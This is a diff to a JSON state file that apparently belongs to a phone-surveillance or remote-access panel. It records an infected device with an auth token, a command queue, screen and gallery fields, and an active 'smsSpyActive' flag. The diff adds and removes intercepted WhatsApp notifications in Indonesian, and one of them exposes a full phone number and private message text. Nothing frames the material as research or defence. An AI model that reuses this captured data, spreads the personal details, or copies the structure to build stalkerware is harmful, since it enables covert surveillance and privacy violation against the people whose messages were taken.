@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776863347452,
+    "lastSeen": 1776863355741,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎60 pesan dari 38 chat",
+        "time": "22/04 21:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776863356509
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-3406-5819",
+        "content": "Oke",
+        "time": "22/04 21:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776863356468
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "22/04 15:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1776842849281
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎78 pesan dari 2 chat",
-        "time": "22/04 15:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842847000
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (70 pesan): ~ D4P4 z4L",
-        "content": "Iya eror",
-        "time": "22/04 15:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842846851
       }
     ],
     "galleryPhotos": [],
